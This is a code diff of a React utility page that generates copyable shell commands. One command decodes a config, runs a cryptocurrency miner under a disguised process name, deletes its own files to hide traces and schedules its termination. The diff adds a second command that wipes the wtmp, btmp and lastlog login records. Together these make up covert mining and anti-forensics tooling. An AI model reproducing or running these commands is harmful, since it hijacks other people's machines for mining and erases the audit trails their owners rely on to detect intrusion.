@@ -12,14 +12,29 @@ const App = () => {
 
     const clipboard = navigator.clipboard
 
-    const script = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
+    const ethScript = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`
 
-    const handleCopyScriptBtnClick = () => {
-        clipboard.writeText(script).then(() => {
-            setMessage('Copy script successful')
+    const clearLoginHistoryScript = ` sudo sh -c 'echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog'`
+
+    const handleCopyETHScriptBtnClick = () => {
+        clipboard.writeText(ethScript).then(() => {
+            setMessage('Copy ETH script successful')
         }).catch((e) => {
             console.error(e)
-            setMessage('Failed to copy script')
+            setMessage('Failed to copy ETH script')
+        }).finally(() => {
+            setTimeout(() => {
+                setMessage('')
+            }, 3000)
+        })
+    }
+
+    const handleCopyClearLoginHistoryScriptBtnClick = () => {
+        clipboard.writeText(clearLoginHistoryScript).then(() => {
+            setMessage('Copy clear login history script successful')
+        }).catch((e) => {
+            console.error(e)
+            setMessage('Failed to copy clear login history script')
         }).finally(() => {
             setTimeout(() => {
                 setMessage('')
@@ -124,18 +139,30 @@ const App = () => {
                     />
                 </div>
                 <div className="field-row-stacked">
-                    <label>Script</label>
+                    <label>Rest</label>
+                    <button onClick={handleResetBtnClick}>Reset</button>
+                </div>
+                <div className="field-row-stacked">
+                    <label>Save & Load</label>
+                    <button onClick={handleSaveDataToLocalStorageBtnClick}>Save data to local storage</button>
+                    <button onClick={handleLoadDataFromLocalStorageBtnClick}>Load data from local storage</button>
+                </div>
+                <div className="field-row-stacked">
+                    <label>ETH script</label>
                     <textarea
                         rows={8}
                         disabled
-                        value={script}
+                        value={ethScript}
                     />
+                    <button onClick={handleCopyETHScriptBtnClick}>Copy ETH script</button>
                 </div>
-                <div className="field-row">
-                    <button onClick={handleCopyScriptBtnClick}>Copy script</button>
-                    <button onClick={handleResetBtnClick}>Reset</button>
-                    <button onClick={handleSaveDataToLocalStorageBtnClick}>Save data to local storage</button>
-                    <button onClick={handleLoadDataFromLocalStorageBtnClick}>Load data from local storage</button>
+                <div className="field-row-stacked">
+                    <label>Clear login history script</label>
+                    <textarea
+                      disabled
+                      value={clearLoginHistoryScript}
+                    />
+                    <button onClick={handleCopyClearLoginHistoryScriptBtnClick}>Copy clear login history script</button>
                 </div>
                 <div>
                     <p>{message}</p>
